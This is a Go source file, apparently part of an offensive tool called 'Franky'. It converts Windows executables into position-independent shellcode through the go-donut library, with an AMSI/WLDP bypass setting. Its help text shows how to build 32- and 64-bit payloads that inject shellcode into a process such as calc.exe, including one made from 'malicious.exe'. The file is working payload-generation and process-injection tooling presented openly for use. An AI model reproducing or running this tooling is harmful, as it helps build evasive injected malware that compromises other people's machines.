package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"time"

	"github.com/Binject/go-donut/donut"
)

// Generate random string of "n" length
func randomString(n int) string {
	rand.Seed(time.Now().UnixNano())
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

// Convert exe to shellcode using Donut
func getShellcode(path string) []byte {
	config := donut.DonutConfig{
		Type:     donut.DONUT_MODULE_EXE,
		InstType: donut.DONUT_INSTANCE_PIC,
		Bypass:   3,
		Format:   uint32(1),
		Arch:     donut.X32,
		Entropy:  0,
		Compress: uint32(1),
		ExitOpt:  1,
		Unicode:  0,
	}
	data, _ := ioutil.ReadFile(path)
	buf := bytes.NewBuffer(data)
	res, err := donut.ShellcodeFromBytes(buf, &config)
	if err != nil {
		fmt.Printf("[*] Error converting exe to shellcode. Error message: %s\n", err)
		os.Exit(1)
	}
	return res.Bytes()
}

// Generate random Battle Franky executable name
func randomExe() string {
	min := 1
	max := 39
	randomNum := rand.Intn(max-min) + min
	return fmt.Sprintf("BF-%d.exe", randomNum)
}

// Help screen footer with usage examples
var footerString = "\n" +
	"Examples:\n" +
	"\t Generate 32bit payload using \"shellcode.bin\" as input:\n" +
	"\t\t ./franky -arch 32 -path shellcode.bin\n" +
	"\t Generate 64bit payload using \"shellcode.bin\" as input and calc.exe as process to inject into:\n" +
	"\t\t ./franky -arch 64 -path shellcode.bin -process C:\\Windows\\System32\\calc.exe\n" +
	"\t Generate 32bit payload, converting input executable \"malicious.exe\" to shellcode:\n" +
	"\t\t ./franky -arch 32 -path malicious.exe -exe\n"

var headerString = `

███████╗██████╗  █████╗ ███╗   ██╗██╗  ██╗██╗   ██╗
██╔════╝██╔══██╗██╔══██╗████╗  ██║██║ ██╔╝╚██╗ ██╔╝
█████╗  ██████╔╝███████║██╔██╗ ██║█████╔╝  ╚████╔╝ 
██╔══╝  ██╔══██╗██╔══██║██║╚██╗██║██╔═██╗   ╚██╔╝  
██║     ██║  ██║██║  ██║██║ ╚████║██║  ██╗   ██║   
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   
`
